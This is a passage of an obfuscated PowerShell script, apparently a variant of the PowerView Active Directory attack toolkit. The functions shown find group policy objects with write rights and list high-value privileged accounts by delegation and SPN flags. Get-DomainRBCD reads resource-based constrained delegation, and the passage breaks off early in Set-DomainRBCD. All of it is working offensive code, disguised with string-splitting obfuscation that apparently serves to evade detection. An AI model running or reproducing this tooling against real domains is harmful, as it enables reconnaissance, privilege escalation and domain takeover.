    ${dOMa`iNL`iST} = @(${f`orE`sT}."D`oM`AinS")
    ${do`M`AIns} = ${Do`mAInl`ISt} | &("{0}{1}"-f'f','oreach') { ${_}.("{0}{1}{3}{2}"-f 'Ge','tDirect','ntry','oryE').Invoke() }
    foreach (${dOMA`In} in ${d`OmA`ins}) {
        ${fI`L`TeR} = "(&(objectCategory=groupPolicyContainer)(displayname=$GPOName))"
        ${s`earC`HEr} = &("{1}{2}{0}"-f 'w-Object','N','e') ("{4}{12}{6}{2}{5}{0}{7}{9}{10}{3}{11}{1}{8}"-f'ry','torySearc','rec','ir','Sys','to','Di','Se','her','rv','ices.D','ec','tem.')
        ${s`e`ArCHer}."Se`ArCHrO`oT" = ${D`oMA`In}
        ${SE`A`RCHEr}."filt`Er" = ${FIL`T`Er}
        ${S`EArch`eR}."PaGe`S`IzE" = ${p`Ag`eSIze}
        ${sEar`C`heR}."seA`R`ChscO`pe" = ("{0}{2}{1}"-f'Su','tree','b')
        ${Li`sTg`po} = ${s`EaR`CHEr}.("{0}{1}{2}" -f'Fi','ndAl','l').Invoke()
        foreach (${G`PO} in ${lI`sTGPO}){
            ${A`Cl} = ([ADSI]${G`po}."P`AtH")."objeCT`sECurI`TY"."A`CcesS" | &('?') {${_}."ac`TIV`Ed`irECTO`RyRiGhTs" -match ("{1}{0}" -f'ite','Wr') -and ${_}."aC`Cess`coN`TrOLTY`pe" -eq ("{0}{1}"-f'A','llow') -and  ${ExcLUs`I`Ons} -notcontains ${_}."I`DEN`TiTYr`eFEREncE".("{1}{2}{0}" -f'ng','toS','tri').Invoke().("{0}{1}" -f'sp','lit').Invoke("\")[1] -and ${_}."ID`En`TiT`YReF`eREnCE" -ne ("{3}{2}{0}{1}{4}"-f'R',' OWNE','TO','CREA','R')}
        if (${a`Cl} -ne ${nU`Ll}){
            ${G`Po`Acl} = &("{2}{1}{0}" -f 'Object','w-','Ne') ("{1}{0}{2}" -f 'obje','ps','ct')
            ${Gp`oAcl} | &("{0}{1}{2}" -f'Add-','Mem','ber') ("{0}{2}{1}" -f 'Notep','perty','ro') ("{1}{0}"-f'th','ADSPa') ${G`pO}."p`ROper`T`IeS"."AdS`PATH"
            ${G`P`oACL} | &("{1}{0}{2}"-f'Mem','Add-','ber') ("{0}{2}{1}"-f 'Notep','perty','ro') ("{0}{2}{1}{3}{4}"-f 'GPOD','spl','i','a','yName') ${G`Po}."p`ROper`Ti`eS"."d`iSPLA`YN`AME"
            ${gpOA`cL} | &("{2}{0}{1}" -f 'dd-Mem','ber','A') ("{1}{0}{2}{3}" -f 'o','N','t','eproperty') ("{0}{2}{1}{5}{4}{3}"-f 'I','en','d','erence','ityRef','t') ${a`cl}."IDE`NtITyRe`F`E`RENCE"
            ${g`P`OaCl} | &("{2}{1}{0}" -f 'ember','M','Add-') ("{0}{2}{3}{1}"-f 'N','y','otepr','opert') ("{1}{0}{3}{6}{5}{4}{2}"-f'ctiveD','A','hts','i','Rig','ry','recto') ${A`Cl}."a`c`TiV`EDiRE`C`ToRYrigHtS"
            ${GPo`ACL}
        }
        }
    }
}

function find-`H`iGhvalu`EacCOUN`Ts {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{6}{2}{1}{0}{4}{5}" -f 'More','rs','seDeclaredVa','P','ThanAssignmen','ts','SU'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{0}{2}"-f 'uldPr','Sho','ocess','PS'}, '')]
    [OutputType({"{1}{4}{2}{0}{3}{5}"-f 'Obj','Powe','.AD','e','rView','ct'})]
    [OutputType({"{3}{2}{0}{4}{1}" -f 'b','t.Raw','O','PowerView.AD','jec'})]
    [CmdletBinding(dEfaulTPARAMEtERSEtnAme = {"{0}{3}{2}{1}" -f 'A','owDelegation','l','l'})]
    Param (
        [Switch]
        ${S`pN},

        [Switch]
        ${e`NA`BleD},

        [Switch]
        ${d`isAB`led},

        [Parameter(paRAmeteRsEtNAME = "aLLoWdEl`E`gatiON")]
        [Switch]
        ${aLL`ow`DEL`eG`ATiOn},

        [Parameter(PARAmeTeRsetnamE = "dIS`ALLOwDele`GAT`IoN")]
        [Switch]
        ${dISAl`lOwD`EleG`Ati`ON},

        [Switch]
        ${PASs`NOt`E`Xpire},

        [Switch]
        ${u`sE`Rs},

        [Switch]
        ${c`OM`PuteRS},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`om`AIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{3}{4}{2}{1}" -f 'Domain','ller','ro','Co','nt'})]
        [String]
        ${SeR`VeR},

        [ValidateRange(1, 10000)]
        [Int]
        ${reS`U`lTP`AgES`Ize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SE`R`VERTImeL`ImIT},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CrEden`T`ial} =   ${7`Tq02}::"E`MpTY",

        [Switch]
        ${r`Aw}
    )

    BEGIN {
        ${S`E`ArChe`RargU`M`eNtS} = @{}
        if (${PsBOun`dp`Ar`AM`Ete`RS}[("{1}{0}"-f 'main','Do')]) { ${SeA`R`cHe`RA`RGU`MENtS}[("{0}{1}"-f 'Doma','in')] = ${dOm`AiN} }
        if (${psBoun`Dpar`A`MEt`erS}[("{1}{0}{2}"-f 'r','Se','ver')]) { ${sEArchE`RA`RgU`meNtS}[("{1}{0}" -f 'r','Serve')] = ${s`ervEr} }
        if (${pSBOUNDP`AraME`Te`RS}[("{3}{2}{1}{4}{0}"-f'e','e','ag','ResultP','Siz')]) { ${s`EAr`Che`RAr`GUments}[("{1}{3}{2}{0}{4}" -f'tPa','Res','l','u','geSize')] = ${reS`U`LTPa`gES`ize} }
        if (${p`sbo`UN`dPaRaM`eTerS}[("{2}{0}{3}{4}{1}" -f'erv','Limit','S','erTim','e')]) { ${sE`ARCh`ErARg`UMeN`TS}[("{2}{3}{0}{1}"-f 'me','Limit','Server','Ti')] = ${sErver`TIMeL`i`mIT} }
        if (${pSBO`Un`D`p`ARAmeTERs}[("{2}{1}{0}"-f'l','redentia','C')]) { ${s`E`A`RCHe`RaRGU`mEnts}[("{1}{0}{2}"-f 'entia','Cred','l')] = ${c`Re`deNTIaL} }
        ${oB`Je`Cts`e`ArCheR} = &("{3}{0}{4}{1}{2}{5}"-f'-D','ear','che','Get','omainS','r') @SearcherArguments

        
        ${admING`RO`U`PS} = @(
            ("{3}{0}{2}{1}{4}" -f 'ount','rator',' Ope','Acc','s'),
            ("{3}{0}{2}{1}" -f 'dmini','tors','stra','A'),
            ("{2}{0}{3}{1}{4}"-f 'kup Oper','r','Bac','ato','s'),
            ("{4}{0}{1}{2}{3}"-f't Publi','sh','er','s','Cer'),
            ("{4}{3}{2}{0}{1}" -f 'n Ad','mins','i','oma','D'),
            ("{0}{4}{2}{3}{1}"-f'Ente','ns',' ','Admi','rprise'),
            ("{1}{4}{5}{2}{0}{3}"-f 'y Admin','Ent','Ke','s','er','prise '),
            ("{1}{2}{0}"-f's','K','ey Admin'),
            ("{3}{0}{2}{4}{1}"-f'i','ors','nt Op','Pr','erat'),
            ("{0}{2}{1}" -f'R','licator','ep'),
            ("{0}{3}{2}{1}"-f'Schem','s','min','a Ad'),
            ("{2}{4}{0}{1}{3}"-f'Op','erat','Se','ors','rver ')
        )

        
        ${IDEnTIt`YF`i`Lt`er} = ''
        ${CH`eck} = @()
    }

    PROCESS {

        foreach (${adMin`gr`OuP} in ${admIn`gRou`pS}) {
            &("{6}{2}{1}{4}{5}{3}{0}" -f'r','n','-Domai','upMembe','Gr','o','Get') ${Ad`m`INgro`UP} -Recurse @SearcherArguments | &('?'){${_}."m`eMBE`R`oBjECt`cLasS" -ne ("{0}{1}"-f'gro','up')} | &("{1}{2}{0}" -f 'ct','ForEach-Obj','e') {
                if (((!(${u`S`ErS})) -And (!(${C`OmPU`TERs}))) -Or (((${uSe`RS}) -And (${_}."MeMBe`Rob`j`eCtClass" -eq ("{0}{1}"-f 'us','er'))) -Or ((${c`OM`pUTers}) -And (${_}."MeMBe`ROBjeCtcL`A`sS" -eq ("{1}{0}{2}"-f'ompute','c','r'))))) {
                    ${Membe`R`N`AME} = ${_}."M`embE`RNA`mE"
                    if ((${mEMB`e`R`NaMe}) -and ((${C`HecK}."c`ount" -eq 0 ) -Or (!(${C`he`Ck}.("{0}{1}{2}"-f 'Co','ntain','s').Invoke(${mEmB`ERna`mE}))))) {
                        ${idenTi`TyFi`ltEr} += "(samaccountname=$MemberName)"
                        ${CH`e`ck} += ${M`emBeRn`AME}
                    }
                }
            }
        }

        ${F`IlTer} = "(|$IdentityFilter)"

        
        if (${PSB`ounDPa`R`AmeT`e`Rs}['SPN']) {
            &("{4}{1}{3}{2}{0}" -f 'se','rite','o','-Verb','W') ("{3}{11}{14}{7}{12}{4}{1}{9}{8}{2}{10}{6}{0}{13}{5}"-f 'incipa','g','ull serv','[Find-H','in',' names','ce pr','ounts] ','r non-n',' fo','i','igh','Search','l','ValueAcc')
            ${Fi`LT`ER} += ("{1}{3}{0}{2}{4}" -f'nc','(s','ipalName=*','ervicePri',')')
        }
        if (${p`sbo`UN`d`p`ArAMeters}[("{1}{0}{2}"-f 'na','E','bled')]) {
            &("{0}{2}{1}" -f'Writ','e','e-Verbos') ("{1}{9}{15}{5}{11}{0}{6}{2}{8}{7}{12}{10}{13}{16}{3}{4}{14}" -f 'al','[','ch','who are e','nab','d-H','ueAccounts] Sear','n','i','F',' ','ighV','g','f','led','in','or users ')
            
            ${f`i`lTeR} += ("{3}{2}{4}{5}{0}{8}{1}{7}{6}"-f '0.113556','03','!(userAcc','(','o','untControl:1.2.84','))',':=2','.1.4.8')
        }
        if (${Ps`BoUnDpar`Am`ete`Rs}[("{0}{1}" -f'Disable','d')]) {
            &("{0}{2}{1}"-f'Writ','se','e-Verbo') ("{12}{6}{3}{15}{11}{4}{9}{2}{0}{14}{5}{7}{8}{10}{16}{1}{13}"-f '] Sea','disabl','counts','i','A',' for users ','nd-H','w','ho a','c','re','alue','[Fi','ed','rching','ghV',' ')
            
            ${fILT`er} += (("{6}{4}{7}{1}{3}{11}{8}{5}{2}{9}{10}{0}"-f ')','ntCo','1.4.','ntr','er','56.','(us','Accou','.840.1135','8','03:=2','ol:1.2'))
        }
        if (${PSb`OUndp`ARAmEt`e`Rs}[("{2}{1}{0}{3}" -f'e','l','AllowDe','gation')]) {
            &("{2}{1}{3}{0}{4}"-f 's','-Verb','Write','o','e') ("{2}{13}{6}{11}{9}{4}{1}{16}{14}{12}{8}{17}{10}{0}{7}{3}{5}{18}{15}"-f' can be','un','[Fin','el','o','e','al',' d','g','eAcc','who','u','Searchin','d-HighV','s] ','ted','t',' for users ','ga')
            
            ${FIl`T`er} += ("{0}{7}{11}{10}{9}{4}{3}{5}{8}{6}{1}{2}"-f'(!(u','4.803:=1048','576))','0.','4','113','6.1.','serA','55','8','l:1.2.','ccountContro')
        }
        if (${p`sB`OU`NDP`AraMETERs}[("{2}{4}{5}{0}{3}{1}" -f 'De','tion','D','lega','is','allow')]) {
            &("{1}{2}{0}" -f 'te-Verbose','W','ri') ("{8}{20}{22}{3}{5}{6}{21}{17}{14}{16}{13}{0}{18}{7}{2}{4}{19}{23}{25}{9}{10}{15}{12}{26}{24}{11}{1}" -f'arching','gation','users who ','ig','ar','hValu','eA','r ','[Fin','iv','e and no','ele',' tru','ts] Se','ou','t','n','c',' fo','e s','d-','c','H','ensi','r d','t','sted fo')
            ${fiLt`eR} += ("{3}{5}{12}{9}{14}{4}{13}{6}{11}{2}{7}{10}{0}{1}{8}"-f '04','857','4.80','(us','1.2.840','erAccou','5','3','6)','tr',':=1','56.1.','ntCon','.113','ol:')
        }
        if (${pSBOu`NDParamE`Te`RS}[("{1}{4}{0}{2}{3}" -f's','Pa','NotEx','pire','s')]) {
            &("{0}{2}{1}" -f'Wr','e-Verbose','it') ("{7}{14}{16}{12}{4}{6}{9}{5}{15}{1}{2}{18}{17}{11}{3}{13}{0}{10}{8}" -f 'xpi','s','ers','neve','S','ch','e','[','e','ar','r','words ','ValueAccounts] ','r e','Fin','ing for u','d-High','ss',' whose pa')
            ${fiL`TeR} += (("{11}{0}{10}{12}{5}{4}{2}{3}{6}{13}{1}{7}{8}{9}" -f'rA','4.','.','1','840','ntrol:1.2.','1','803:=','65','536)','ccou','(use','ntCo','3556.1.'))
        }

        ${oBJE`ctsEA`RCh`er}."fIlT`er" = "(&$Filter)"
        &("{0}{2}{3}{1}" -f'Wri','bose','te-Ve','r') "[Find-HighValueAccounts] Find-HighValueAccounts filter string: $($ObjectSearcher.filter) "
        ${R`eSu`LTs} = ${O`BJEc`T`SeaR`CHER}.("{2}{1}{0}" -f 'l','indAl','F').Invoke()
        ${rESuL`Ts} | &("{1}{2}{0}"-f 'ject','Where-O','b') {${_}} | &("{0}{3}{1}{2}"-f'Fo','Each-Objec','t','r') {
            if (${PsbO`UNDPArA`Met`ers}['Raw']) {
                
                ${OB`je`ct} = ${_}
                ${oBjE`ct}."p`s`obJECT"."TypEN`A`mes".("{0}{1}" -f'Ins','ert').Invoke(0, ("{2}{5}{0}{1}{4}{3}"-f 'ew','.A','P','ct.Raw','DObje','owerVi'))
            }
            else {
                ${OB`JECT} = &("{5}{3}{2}{4}{0}{1}"-f 'o','perty','ert-','v','LDAPPr','Con') -Properties ${_}."P`Ro`Pert`ieS"
                ${oBJe`cT}."PSOb`Je`Ct"."tY`pE`NAMes".("{2}{1}{0}"-f't','nser','I').Invoke(0, ("{0}{4}{2}{1}{3}" -f 'PowerView','O','AD','bject','.'))
            }
            ${oB`j`eCt}
        }
        if (${re`S`ULts}) {
            try { ${reSU`L`Ts}.("{2}{0}{1}" -f 'sp','ose','di').Invoke() }
            catch {
                &("{2}{1}{0}{3}" -f 'os','erb','Write-V','e') ('[Find'+'-High'+'V'+'a'+'l'+'u'+'eAccoun'+'ts] '+'E'+'r'+'ror '+'d'+'ispos'+'in'+'g '+'of'+' '+'t'+'he '+'Res'+'ults '+'object'+': '+"$_")
            }
        }
        ${O`BJE`ctSea`RCH`Er}.("{1}{0}" -f'ose','disp').Invoke()
    }
}

function gET`-do`MAi`Nr`BCd {

    [OutputType([PSObject])]
    [CmdletBinding()]
    Param (
        [Parameter(PoSItIoN = 0, ValUEFRoMpiPelIne = ${T`RUe}, vaLuEFROMpIpElinEbypRoPeRTYnAMe = ${TR`UE})]
        [Alias({"{1}{0}{2}" -f'unt','SamAcco','Name'}, {"{0}{1}"-f 'N','ame'}, {"{1}{2}{0}" -f'stName','DN','SHo'})]
        [String[]]
        ${idE`N`TITy},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`o`mAIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f'ilter','F'})]
        [String]
        ${lDAP`F`Il`TEr},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PR`oPe`R`TIes},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f 'A','DSPath'})]
        [String]
        ${S`eARCHBa`sE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}{3}"-f'D','omainCon','troll','er'})]
        [String]
        ${s`er`VeR},

        [ValidateSet({"{0}{1}"-f 'Bas','e'}, {"{0}{2}{1}"-f'One','vel','Le'}, {"{2}{0}{1}"-f 'tre','e','Sub'})]
        [String]
        ${SE`ArC`hSCO`Pe} = ("{0}{1}{2}"-f'Su','btr','ee'),

        [ValidateRange(1, 10000)]
        [Int]
        ${ReSU`LtP`AgeS`izE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SeR`Vert`im`E`lImit},

        [ValidateSet({"{1}{0}"-f'l','Dac'}, {"{0}{1}"-f'Grou','p'}, {"{0}{1}"-f 'N','one'}, {"{0}{1}"-f 'O','wner'}, {"{1}{0}" -f 'acl','S'})]
        [String]
        ${sec`UritY`ma`SkS},

        [Switch]
        ${tomBS`T`onE},

        [Alias({"{2}{0}{1}" -f 'etu','rnOne','R'})]
        [Switch]
        ${f`inDo`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`E`deNT`IAL} =   (gEt-variaBlE  ("7t"+"Q02")  )."V`AlUE"::"em`ptY",

        [Switch]
        ${R`AW}
    )


    BEGIN {
        ${sEA`RchE`R`ARGUMe`Nts} = @{}
        if (${pS`BOUndp`ArAMEt`ers}[("{1}{0}"-f'ain','Dom')]) { ${s`earchERAR`gu`ME`NtS}[("{0}{1}" -f 'Domai','n')] = ${d`OmAiN} }
        if (${psboUndpARA`me`Te`Rs}[("{2}{0}{1}{3}"-f'ro','per','P','ties')]) { ${sEArchE`R`ARg`UME`NtS}[("{3}{0}{2}{1}"-f'op','s','ertie','Pr')] = ${PR`OP`ErTi`ES} }
        if (${pSbou`Ndpar`A`me`TeRs}[("{0}{1}{3}{2}"-f'Se','a','e','rchBas')]) { ${sEaRCh`E`R`ArgumeNTS}[("{2}{0}{1}" -f 'archB','ase','Se')] = ${seaRchB`A`SE} }
        if (${p`sboUNdpa`RaMe`TE`Rs}[("{0}{1}{2}" -f 'Se','rv','er')]) { ${sEA`Rch`ERArG`UMeNts}[("{1}{0}" -f'er','Serv')] = ${sER`VEr} }
        if (${P`sB`O`U`Nd`PAraMeteRs}[("{2}{0}{3}{1}" -f'rchSc','pe','Sea','o')]) { ${SEARcH`eRAR`gU`MEn`TS}[("{2}{0}{1}"-f'ea','rchScope','S')] = ${SEa`R`chS`cOPE} }
        if (${ps`B`oUN`DpARA`M`eTErS}[("{3}{0}{1}{2}" -f'su','l','tPageSize','Re')]) { ${SeAR`cHer`Ar`Gume`N`TS}[("{4}{1}{3}{0}{2}"-f'tPag','e','eSize','sul','R')] = ${RE`sULt`PAG`Esi`zE} }
        if (${PSbO`UNdparam`eTE`RS}[("{2}{1}{0}" -f'verTimeLimit','r','Se')]) { ${sEARc`H`erA`Rgu`ME`NtS}[("{3}{0}{1}{2}"-f'rverTimeLi','m','it','Se')] = ${s`E`RvERTiM`elI`miT} }
        if (${psbOuND`P`Ar`A`meTerS}[("{2}{3}{1}{0}" -f 'asks','M','Securi','ty')]) { ${se`A`R`cHERARGUMen`TS}[("{3}{4}{1}{0}{2}"-f 'sk','ityMa','s','Se','cur')] = ${sEc`URiT`YMASKS} }
        if (${PSbO`UndPaR`AME`TE`RS}[("{1}{0}" -f 'one','Tombst')]) { ${sEarChe`RaR`gum`entS}[("{0}{1}"-f'Tombst','one')] = ${ToM`BS`ToNE} }
        if (${pSBou`N`dpARAmeTe`RS}[("{2}{1}{0}" -f'ial','t','Creden')]) { ${sEAR`CHerArg`UMEN`Ts}[("{0}{2}{1}" -f'Cred','al','enti')] = ${C`Re`DENtI`AL} }
        ${rBC`D`search`er} = &("{1}{2}{0}{3}" -f'oma','Ge','t-D','inSearcher') @SearcherArguments
    }

    PROCESS {
        
        if (${PsB`oundpa`R`AME`T`ERS} -and (${psB`o`Undpa`RaMe`TeRS}."c`Ount" -ne 0)) {
            &("{2}{4}{1}{0}{3}" -f 'a','-DynamicPar','Ne','meter','w') -CreateVariables -BoundParameters ${P`S`BouNdpA`R`AmE`TeRs}
        }
        if (${rBc`DS`eaR`ChER}) {
            ${id`ENti`T`yfILTer} = ''
            ${f`IlTEr} = ''
            ${iD`E`NTitY} | &("{0}{2}{1}{3}{4}"-f'Get-','tityFilterS','Iden','tri','ng') | &("{0}{4}{2}{3}{1}"-f 'F','t','h-Obj','ec','orEac') {
                ${iD`Entit`YFI`LTer} += ${_}
            }
            if (${IdeNtIT`Y`FILteR} -and (${ide`NtI`Ty`FiLter}.("{0}{1}" -f 'T','rim').Invoke() -ne '') ) {
                ${FIL`TeR} += "(|$IdentityFilter)"
            }

            ${fI`Lt`er} += (("{5}{6}{0}{2}{7}{1}{4}{3}" -f'-allow','onbehalfofotherident','e','y=*)','it','(ms','ds','dtoact'))

            if (${psbo`UNDpa`RAm`et`E`RS}[("{1}{2}{0}" -f'Filter','L','DAP')]) {
                &("{0}{2}{1}" -f 'W','bose','rite-Ver') ('[Ge'+'t-'+'Do'+'m'+'ain'+'RBCD] '+'Usin'+'g'+' '+'addition'+'a'+'l '+'LDAP'+' '+'f'+'ilte'+'r: '+"$LDAPFilter")
                ${F`iLTEr} += "$LDAPFilter"
            }
            if (${F`ILt`eR} -and ${FiLt`Er} -ne '') {
                ${rbCd`Sea`Rch`Er}."Fil`TeR" = "(&$Filter)"
            }
            &("{3}{2}{1}{0}"-f 'se','o','te-Verb','Wri') "[Get-DomainRBCD] Get-DomainRBCD filter string: $($RBCDSearcher.filter) "

            if (${PsbOUN`d`Pa`Ra`MEtE`RS}[("{2}{1}{0}" -f 'One','nd','Fi')]) { ${rE`Sul`TS} = ${RB`Cds`ea`RC`HER}.("{1}{0}"-f 'One','Find').Invoke() }
            else { ${REs`U`lTs} = ${RBCD`S`eaR`CHer}.("{2}{0}{1}"-f'indAl','l','F').Invoke() }
            ${Re`Sul`Ts} | &("{1}{0}{2}"-f '-Ob','Where','ject') {${_}} | &("{1}{2}{0}{3}"-f 'jec','ForEac','h-Ob','t') {
                if (${PSbOU`NDPA`RA`MEt`ers}['Raw']) {
                    
                    ${ObjE`Ct} = ${_}
                    ${obJ`ecT}."pso`BjE`cT"."T`YP`ENAmEs".("{1}{0}"-f 't','Inser').Invoke(0, ("{3}{2}{4}{1}{5}{0}" -f 'w','b','werView.A','Po','DO','ject.Ra'))
                }
                else {
                    ${oBjE`ct} = &("{3}{0}{1}{2}"-f 'onvert-LDAPProp','er','ty','C') -Properties ${_}."Pr`op`ERTi`ES"
                    ${objE`Ct}."P`SOB`JECt"."Ty`PEN`AM`ES".("{1}{2}{0}" -f'ert','In','s').Invoke(0, ("{1}{0}{3}{4}{2}" -f'rV','Powe','ct','iew.ADObj','e'))
                }

                ${R} = ${O`Bj`Ect} | &("{0}{2}{1}"-f 's','lect','e') -expand ("{9}{6}{1}{5}{8}{7}{0}{3}{4}{2}" -f 'd','l','ity','e','nt','fofo','-allowedtoactonbeha','eri','th','msds')
                ${d} = &("{0}{2}{1}"-f 'New-O','ect','bj') ("{0}{7}{4}{8}{3}{2}{1}{6}{5}" -f 'S','.RawSecurit','ontrol','C','ity','Descriptor','y','ecur','.Access') -ArgumentList ${R}, 0
                ${d}."disc`REti`o`NAr`yAcL" | &("{0}{3}{1}{2}"-f'ForEa','Objec','t','ch-') {
                    ${rBC`dOb`jE`ct} = &("{1}{0}{2}"-f'w-','Ne','Object') ("{0}{2}{1}"-f 'PSOb','ct','je')
                    ${rBCD`oB`JEcT} | &("{1}{2}{0}" -f'ember','Add','-M') ("{1}{0}{2}" -f 'rce','Sou','Name') ${oBJE`cT}."S`AmacCOUn`T`NAME"
                    ${R`BCDobJ`e`Ct} | &("{1}{2}{0}" -f'er','Ad','d-Memb') ("{1}{2}{0}" -f'ype','Source','T') ${o`BjE`cT}."s`Ama`cCOuntTY`pe"
                    ${r`BC`doB`jeCT} | &("{2}{1}{0}"-f'r','d-Membe','Ad') ("{0}{1}" -f 'Source','SID') ${OBJ`E`cT}."O`BJeCt`SId"
                    ${r`BcDoB`JECt} | &("{2}{1}{0}" -f 'mber','e','Add-M') ("{3}{4}{0}{1}{2}"-f't','Contro','l','Sourc','eAccoun') ${OBj`ECt}."UsERACC`OuntCO`NTr`oL"
                    ${r`Bcdo`BjEct} | &("{0}{1}{2}{3}" -f'A','dd','-M','ember') ("{3}{0}{2}{1}"-f 'inguis','me','hedNa','SourceDist') ${ObJ`e`cT}."DIStIn`GUI`s`hEdN`Ame"
                    ${r`B`CdObJE`CT} | &("{1}{0}{2}" -f'd','A','d-Member') ("{3}{2}{1}{0}{4}" -f 'cip','n','icePri','Serv','alName') ${oBJ`Ect}."s`Erv`iC`eP`RIncipaLn`AmE"

                    ${D`e`LeGated} = &("{2}{1}{3}{0}{4}"-f'bje','t-','Ge','DomainO','ct') ${_}."seCU`R`I`TYI`d`EnTiFIEr"
                    ${rB`cDobJ`ECT} | &("{0}{3}{1}{2}"-f'A','d-Memb','er','d') ("{0}{2}{3}{1}{4}" -f'Deleg','am','ate','dN','e') ${DeLEg`A`Ted}."SAm`Ac`cou`NtnamE"
                    ${r`BcdOB`JE`Ct} | &("{0}{1}{2}" -f'Ad','d-Membe','r') ("{2}{1}{0}{3}"-f'yp','dT','Delegate','e') ${del`EgA`TeD}."sAm`ACcoU`N`TTY`PE"
                    ${Rb`c`Do`BJECt} | &("{1}{2}{0}" -f 'r','Ad','d-Membe') ("{3}{2}{1}{0}" -f'SID','d','gate','Dele') ${_}."sE`cUrITYiD`ENt`iF`ier"
                    ${rbCd`oBj`e`CT} | &("{2}{3}{1}{0}" -f'er','mb','Add-M','e') ("{3}{5}{1}{0}{6}{4}{2}"-f 'tedAc','lega','ol','D','ntContr','e','cou') ${dEl`egA`Ted}."us`Er`AcCoUn`TC`On`TroL"
                    ${rB`CdO`Bje`Ct} | &("{1}{0}{2}"-f'm','Add-Me','ber') ("{0}{2}{5}{1}{3}{4}{6}"-f 'Dele','e','g','dDisti','nguishedNa','at','me') ${D`ElegAT`ED}."D`i`st`iNguish`e`DNaME"

                    ${rB`CD`Obj`EcT}
                }
            }
            if (${ResuL`TS}) {
                try { ${R`ESU`lTs}.("{2}{1}{0}"-f'ose','isp','d').Invoke() }
                catch {
                    &("{4}{0}{2}{1}{3}" -f'r','er','ite-V','bose','W') ('[Get'+'-DomainRBC'+'D'+']'+' '+'Error'+' '+'di'+'s'+'posing '+'of'+' '+'th'+'e '+'R'+'esults '+'ob'+'ject: '+"$_")
                }
            }
            ${rbc`dSE`AR`ChER}.("{2}{0}{1}" -f'os','e','disp').Invoke()
        }
    }
}

function seT-dO`maI`N`RbCD {

    [OutputType([bool])]
    [CmdletBinding()]
    Param (
        [Parameter(PoSItion = 0, ValUefRomPIPeLInE = ${tr`UE}, ValUeFRomPIpelINebYpROpeRTYnAmE = ${Tr`Ue})]
        [Alias({"{3}{1}{0}{2}" -f 'tN','amAccoun','ame','S'}, {"{1}{0}"-f 'e','Nam'}, {"{1}{2}{0}{3}"-f'stNam','DNSH','o','e'})]
        [String[]]
        ${I`De`NTITy},

        [String]
        ${dE`l`ega`TEFrom},

        [Switch]
        ${c`leAr},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dO`m`AIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f 'F','ilter'})]
        [String]
        ${lDaPF`IL`T`ER},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pR`op`eRtieS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f'th','ADSPa'})]
        [String]
        ${Se`Ar`cHBasE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{3}{1}{4}{0}"-f'er','n','Doma','inCo','troll'})]
        [String]
        ${seRv`Er},

        [ValidateSet({"{0}{1}" -f 'Bas','e'}, {"{1}{2}{0}" -f'vel','OneL','e'}, {"{1}{2}{0}" -f'e','Su','btre'})]
        [String]
        ${Se`ARcHS`c`Ope} = ("{2}{1}{0}" -f'e','ubtre','S'),

        [ValidateRange(1, 10000)]
        [Int]
        ${R`ESuLtp`AgEsiZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${se`RVe`RTImEl`iMIt},

        [ValidateSet({"{0}{1}" -f'Dac','l'}, {"{1}{0}"-f'up','Gro'}, {"{0}{1}" -f 'Non','e'}, {"{0}{1}" -f 'Owne','r'}, {"{0}{1}"-f 'S','acl'})]
        [String]
        ${sE`CURI`TYMASKS},

        [Switch]
        ${tOmb`Sto`Ne},

        [Alias({"{0}{1}{2}"-f'Return','O','ne'})]
        [Switch]
        ${F`iNd`One},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`E`den`TIaL} =   ${7`Tq02}::"Emp`Ty",

        [Switch]
        ${r`AW}
    )


    BEGIN {
        ${seA`R`chER`A`RGUme`NTS} = @{}
        if (${PsBOUNdPa`R`Am`eTerS}[("{1}{0}" -f 'main','Do')]) { ${sea`R`cHeRargUM`E`Nts}[("{1}{0}"-f'ain','Dom')] = ${dOm`A`IN} }
        if (${P`s`BoUNdpARAM`ET`eRS}[("{1}{3}{2}{0}"-f'es','Proper','i','t')]) { ${s`eARch`e`RarGUmE`NTs}[("{0}{1}{2}" -f 'Pro','pe','rties')] = ${PrO`perti`es} }
        if (${Psbo`UNDpaRA`M`EtErs}[("{0}{2}{1}"-f 'Sear','se','chBa')]) { ${s`EaRCh`e`RArGUMENTS}[("{3}{1}{0}{2}" -f 'hBas','arc','e','Se')] = ${sEARc`h`BA`SE} }
        if (${p`SboU`NDP`ArAm`e`TerS}[("{1}{0}" -f 'rver','Se')]) { ${S`eArcheRA`RGU`MEntS}[("{2}{0}{1}"-f 'rv','er','Se')] = ${s`e`RvER} }
        if (${P`SbO`UN`dParA`mE`TErS}[("{0}{2}{1}"-f'SearchS','e','cop')]) { ${SeAr`C`HeRaRG`UME`Nts}[("{3}{0}{1}{2}" -f 'archS','co','pe','Se')] = ${se`A`RcHSCO`Pe} }
        if (${pSBOundpar`A`ME`T`ERS}[("{1}{2}{3}{0}{4}" -f 'eSi','ResultP','a','g','ze')]) { ${SeaRCHeraR`G`U`MENts}[("{0}{2}{1}{3}" -f 'ResultP','S','age','ize')] = ${ReSulT`p`AgES`iZe} }
        if (${pSBOUNdPaRAM`e`TE`RS}[("{1}{0}{3}{2}"-f 'e','Serv','eLimit','rTim')]) { ${SE`AR`c`HERarguME`NTs}[("{1}{0}{2}" -f 'erTim','Serv','eLimit')] = ${SERV`e`Rtime`Li`m`It} }
